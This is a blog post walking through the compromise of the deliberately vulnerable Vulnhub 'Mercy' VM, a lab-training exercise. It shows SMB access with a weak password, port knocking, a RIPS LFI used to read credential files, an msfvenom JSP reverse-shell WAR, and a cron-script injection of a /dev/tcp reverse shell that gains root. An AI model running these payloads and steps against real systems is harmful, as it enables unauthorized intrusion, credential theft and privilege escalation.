<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="MERCY is a machine dedicated to Offensive Security for the PWK course. MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.
MERCY is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click here.
Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 The machine IP address is 192."><meta name=keywords content=",Vulnhub"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://fspxnky.github.io/mercy/><title>Mercy :: fspxnky â€” Security Blog</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Mercy"><meta itemprop=description content="MERCY is a machine dedicated to Offensive Security for the PWK course. MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.
MERCY is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click here.
Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 The machine IP address is 192."><meta itemprop=datePublished content="2022-04-13T16:11:47+08:00"><meta itemprop=dateModified content="2022-04-13T16:11:47+08:00"><meta itemprop=wordCount content="1823"><meta itemprop=keywords content="Vulnhub,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Mercy"><meta name=twitter:description content="MERCY is a machine dedicated to Offensive Security for the PWK course. MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.
MERCY is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click here.
Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 The machine IP address is 192."><meta property="article:published_time" content="2022-04-13 16:11:47 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>/home/fspxnky</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/tags>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><a href=https://fspxnky.github.io/mercy/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>cat ./Mercy.md</span>
<span class=logo__cursor></span></div></a><p>Reading Time: 8 minutes and 17 seconds.</p><h2 class=post-title>Mercy</h2><div class=post-content><p>MERCY is a machine dedicated to Offensive Security for the PWK course. MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.</p><p>MERCY is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click <a href=https://www.vulnhub.com/entry/digitalworldlocal-development,280/>here</a>.</p><p>Feel free to contact the author at <a href=https://donavan.sg/blog>https://donavan.sg/blog</a> if you would like to drop a comment.</p><blockquote><p>The machine IP address is <code>192.168.50.111</code> for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.</p></blockquote><h2 id=scanning>Scanning</h2><p>Let us start by scanning using Nmap to find any opened ports in the machine.</p><pre tabindex=0><code># Nmap 7.92 scan initiated Wed Apr 13 03:39:13 2022 as: nmap -sS -p- -oN initial.scan 192.168.50.111
Nmap scan report for 192.168.50.111
Host is up (0.0025s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   filtered http
110/tcp  open     pop3
139/tcp  open     netbios-ssn
143/tcp  open     imap
445/tcp  open     microsoft-ds
993/tcp  open     imaps
995/tcp  open     pop3s
8080/tcp open     http-proxy
</code></pre><p>From the scan, it tells us that several ports is open/filtered:</p><ul><li>SSH = Port 22 (Filtered)</li><li>DNS = Port 53</li><li>HTTP = Port 80 (Filtered) and Port 8080</li><li>POP3 = Port 110 and 995</li><li>Samba = Port 139 and 445</li><li>Imaps = Port 993</li></ul><p>Port 22 and 80 is filtered. Most probably I need to find some type of file to open it.</p><h2 id=enumeration>Enumeration</h2><h4 id=port-8080-http-tomcat>Port 8080 (HTTP Tomcat)</h4><p>Navigating to this site, we are welcomed with a default Tomcat page. Tried to log in to both <code>manager</code> and <code>host-manager</code> site with default credential but it didnt work. Next i check if the site has <code>/robots.txt</code> and it leads me to <code>/tryharder/tryharder</code>.</p><p>Moving to <code>http://ipaddress:8080/tryharder/tryharder</code> shows me a base64 text. Lets copy the base64 to the terminal and decode it:</p><pre tabindex=0><code>echo -n SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==&#39; | base64 -d

It&#39;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password &#34;password&#34;, quite literally sticking on a post-it in front of an employee&#39;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
</code></pre><p>Reading the story, I know that the workers in the company commonly use their password as <code>password</code>.</p><h4 id=port-139-and-445-samba>Port 139 and 445 (Samba)</h4><p>Heading to samba next, I start off with listing share folder:</p><pre tabindex=0><code>smbclient -L \\\\192.168.50.111\\        
Enter WORKGROUP\kali&#39;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	qiu             Disk      
	IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
</code></pre><p>There&rsquo;s a shared folder called <code>qiu</code>. Trying to access it anonymously will not work. Somehow i know that the shared folder name is also a potential username, i log in with <code>qiu</code> with the password of <code>password</code>:</p><pre tabindex=0><code>smbclient -U qiu \\\\192.168.50.111\\qiu
Enter WORKGROUP\qiu&#39;s password: 
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Aug 31 15:07:00 2018
  ..                                  D        0  Mon Nov 19 11:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
  .public                            DH        0  Sun Aug 26 10:23:24 2018
  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
  .cache                             DH        0  Fri Aug 31 14:22:05 2018
  .private                           DH        0  Sun Aug 26 12:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
  .profile                            H      675  Sun Aug 26 09:19:34 2018
  		19213004 blocks of size 1024. 16329116 blocks available
smb: \&gt;
</code></pre><p>And we got a hit! Navigate to <code>.private</code> folder, we have <code>readme.txt</code> and <code>opensesame</code> directory. Inside the directory we have 2 more files that we can download. Lets download this file and view it.</p><pre tabindex=0><code>cat readme.txt 
This is for your own eyes only. In case you forget the magic rules for remote administration.

less config
Here are settings for your perusal.

Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
</code></pre><p>Nice! From the <code>readme.txt</code>, we can tell that this file is meant to be a secret and its for remote adminstration. Reading <code>config</code> file show us how to open both Port 22 and 80. Lets open the Port so we can progress our enumeration:</p><pre tabindex=0><code>â”Œâ”€â”€(kaliã‰¿kali)-[~/Vulnhub/Mercy]
â””â”€$ knock 192.168.50.111 159 27391 4

â”Œâ”€â”€(kaliã‰¿kali)-[~/Vulnhub/Mercy]
â””â”€$ knock 192.168.50.111 17301 28504 9999
                                                                                                                                                            
â”Œâ”€â”€(kaliã‰¿kali)-[~/Vulnhub/Mercy]
â””â”€$ sudo nmap -sS -p- 192.168.50.111 -oN afterKnock.scan 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 07:38 EDT
Nmap scan report for 192.168.50.111
Host is up (0.0029s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds
</code></pre><p>And both Port 22 and 80 that was filtered earlier, is now open.</p><h4 id=port-80-http>Port 80 (HTTP)</h4><p>Navigating to <code>http://ipaddress</code> will bring us to a static page saying:</p><p><code>This machine shall make you plead for mercy! Bwahahahaha!</code>.</p><p>Checking the <code>/robots.txt</code> in the URL shows that we can access to 2 directories:</p><ul><li>/mercy (Just another static page)</li><li>/nomercy</li></ul><p>Heading to <code>http://ipaddress/nomercy</code> will bring us to a RIPS version 0.53 web page.</p><img src=/Mercy/1.png class=center style=border-radius:8px><p>Since now we know that the web page is running RIPS 0.53, I can search for vulnerability in searchsploit. Reading this vulnerability tell us that this static source code anaylzer is vulnerable to Multiple Local File Inclusion. I can achieve LFI from both <code>code.php</code> and <code>function.php</code>. More of it can be read here: <a href=https://www.exploit-db.com/exploits/18660>https://www.exploit-db.com/exploits/18660</a></p><p>Navigating to <code>/windows</code>, I can see that we have those 2 files.</p><img src=/Mercy/2.png class=center style=border-radius:8px><p>Lets test it out with <code>code.php</code> by reading <code>/etc/passwd</code> file:</p><img src=/Mercy/3.png class=center style=border-radius:8px><p>Nice it work! Take down potential username that we could use to log in later.</p><p>Now that we have LFI, the next step I&rsquo;ll do is to find the credential for Tomcat so that i could log in. Reading the default Tomcat home page, its mentioned that users are defined in <code>/etc/tomcat7/tomcat-users.xml</code>. Lets LFI to that file:</p><img src=/Mercy/4.png class=center style=border-radius:8px><p>We got 2 users and passwords but only 1 user can log in to the Tomcat due to the roles given. Username and Password found so far:</p><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>thisisasuperduperlonguser</td><td>heartbreakisinevitable</td></tr><tr><td>fluffy</td><td>freakishfluffybunny</td></tr><tr><td>qiu</td><td>password</td></tr></tbody></table><h4 id=back-to-port-8080-http-tomcat>Back to Port 8080 (HTTP Tomcat)</h4><p>Now that we have the credentials, lets login to the Tomcat Manager. Upon successfully log in, we can see this page:</p><img src=/Mercy/5.png class=center style=border-radius:8px><h2 id=initial-foothold>Initial Foothold</h2><p>I going to craft the WAR payload using msfvenom to upload it in the Tomcat Manager:</p><pre tabindex=0><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f war &gt; shell.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
</code></pre><p>Once done, upload the WAR file. It should appear in the <code>Application</code> section.</p><img src=/Mercy/6.png class=center style=border-radius:8px><p>Set up a <code>nc</code> listener and click on the <code>/shell</code> that is located inside the <code>Applications</code>. We now have a shell as tomcat! Let&rsquo;s stable the shell before moving forward.</p><pre tabindex=0><code>â”Œâ”€â”€(kaliã‰¿kali)-[~/Vulnhub/Mercy]
â””â”€$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.2] from (UNKNOWN) [192.168.50.111] 41252
id                         
uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
which python3 
/usr/bin/python3
python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
tomcat7@MERCY:/var/lib/tomcat7$ export TERM=xterm
export TERM=xterm
tomcat7@MERCY:/var/lib/tomcat7$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                                                            
â”Œâ”€â”€(kaliã‰¿kali)-[~/Vulnhub/Mercy]
â””â”€$ stty raw -echo; fg                                                                                                                            148 â¨¯ 1 âš™
[1]  + continued  nc -lvnp 1234

tomcat7@MERCY:/var/lib/tomcat7$ 
</code></pre><h2 id=privileged-escalation>Privileged Escalation</h2><h4 id=tomcat7-to-fluffy>Tomcat7 to Fluffy</h4><p>Remember fluffy password from the tomcat credential? Yeah we can use that password to switch to <code>fluffy</code>. Upon changing, we are using <code>sh</code> shell. We can change it to <code>bash</code> by simply using the <code>chsh</code> command:</p><pre tabindex=0><code>tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
Password: 
$ chsh
Password: 
Changing the login shell for fluffy
Enter the new value, or press ENTER for the default
	Login Shell [/bin/sh]: /bin/bash
$ exit
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
Password: 
fluffy@MERCY:/var/lib/tomcat7$
</code></pre><h4 id=fluffy-to-root>Fluffy to Root</h4><p>In <code>fluffy</code> home dir, there&rsquo;s a file called <code>timeclock</code> inside <code>/.private/secrets</code>. Viewing <code>timeclock</code> show us that its running some kind of script that will <code>echo</code> the <code>date</code> command and store it at <code>/var/www/html/time</code>. Every 3 mins the file will get overwrite. I believe there&rsquo;s crontab running as root. As <code>fluffy</code>, I can edit the file too.</p><pre tabindex=0><code>fluffy@MERCY:~$ ls -la
total 16
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 6 root   root   4096 Nov 20  2018 ..
-rw------- 1 fluffy fluffy  312 Aug  5 00:52 .bash_history
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .private
fluffy@MERCY:~$ cd .private/
fluffy@MERCY:~/.private$ ls -la
total 12
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 ..
drwxr-xr-x 2 fluffy fluffy 4096 Aug  4 21:36 secrets
fluffy@MERCY:~/.private$ cd secrets/
fluffy@MERCY:~/.private/secrets$ ls -la
total 24
drwxr-xr-x 2 fluffy fluffy 4096 Aug  4 21:36 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root    263 Aug  4 21:36 timeclock
fluffy@MERCY:~/.private/secrets$ cat timeclock
#!/bin/bash

now=$(date)
echo &#34;The system time is: $now.&#34; &gt; ../../../../../var/www/html/time
echo &#34;Time check courtesy of LINUX&#34; &gt;&gt; ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
fluffy@MERCY:~/.private/secrets$ cat /var/www/html/time
The system time is: Thu Aug  5 01:00:01 +08 2021.
Time check courtesy of LINUX
fluffy@MERCY:~/.private/secrets$ date
Thu Aug  5 01:01:51 +08 2021
fluffy@MERCY:~/.private/secrets$
</code></pre><p>So to exploit this, I just have to add <code>bash -i >& /dev/tcp/10.10.10.2/1235 0>&1</code> to the <code>timeclock</code> file, set up a <code>nc</code> listener and wait for 3 mins.</p><pre tabindex=0><code>echo &#34;bash -i &gt;&amp; /dev/tcp/10.10.10.2/1235 0&gt;&amp;1&#34; &gt;&gt; timeclock 

# On my terminal 
nc -lvnp 1235 
listening on [any] 1235 ...

# Wait for 3 mins and we get shell
connect to [10.10.10.2] from (UNKNOWN) [192.168.50.111] 51418
bash: cannot set terminal process group (5008): Inappropriate ioctl for device
bash: no job control in this shell
root@MERCY:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@MERCY:~# ls /root
ls /root
author-secret.txt
config
proof.txt
root@MERCY:~# cat /root/proof.txt
cat /root/proof.txt
Congratulations on rooting MERCY. :-)
root@MERCY:~# 
</code></pre><h2 id=summary>Summary</h2><p>I would say this machine is quite fun. The idea of bouncing around and port knocking does make someone think on what to do next. I did enumerate the other ports such as DNS, POP3 and Imaps but i didn&rsquo;t get anything from it. Of course, I almost got into a rabbit hole if <code>RollofDeath</code> didn&rsquo;t stop me. Overall, it was a fun box. I learn a lot from it. 2 more of this machine and Im sadly done with the series. See you in the next post!</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://fspxnky.github.io/tags/vulnhub/>Vulnhub</a></span></p></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l+qxcnN3UWK6NyURtxH+ovdgjyFuaKZ7si1g=="></script></body></html>